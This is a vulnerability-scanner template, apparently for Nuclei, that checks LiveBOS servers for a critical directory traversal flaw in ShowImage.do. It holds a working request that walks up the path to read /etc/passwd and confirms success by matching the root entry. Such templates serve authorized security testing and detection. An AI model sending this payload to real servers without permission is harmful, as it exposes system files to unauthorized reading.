id: livebos-showimage-fileread

info:
  name: LiveOBS - Directory Traversal
  author: Co5mos
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200